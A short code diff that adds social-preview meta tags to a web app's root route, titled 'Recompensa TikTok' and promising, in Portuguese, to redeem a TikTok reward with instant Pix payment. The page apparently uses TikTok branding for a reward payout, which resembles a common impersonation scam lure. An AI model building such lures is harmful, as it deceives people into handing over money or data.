@@ -85,6 +85,10 @@ export const Route = createRootRouteWithContext<{ queryClient: QueryClient }>()(
       { property: "og:description", content: "Resgate sua recompensa TikTok com pagamento via Pix instantâneo." },
       { property: "og:type", content: "website" },
       { name: "twitter:card", content: "summary_large_image" },
+      { name: "twitter:title", content: "Recompensa TikTok" },
+      { name: "twitter:description", content: "Resgate sua recompensa TikTok com pagamento via Pix instantâneo." },
+      { property: "og:image", content: "https://pub-bb2e103a32db4e198524a2e9ed8f35b4.r2.dev/50f61344-3ad8-4d2a-af27-67e4acf82467/id-preview-0d81ab1f--218b5110-e9e7-4f0e-8e0a-6b9b4e3bde16.lovable.app-1782166830293.png" },
+      { name: "twitter:image", content: "https://pub-bb2e103a32db4e198524a2e9ed8f35b4.r2.dev/50f61344-3ad8-4d2a-af27-67e4acf82467/id-preview-0d81ab1f--218b5110-e9e7-4f0e-8e0a-6b9b4e3bde16.lovable.app-1782166830293.png" },
     ],
     links: [
       {
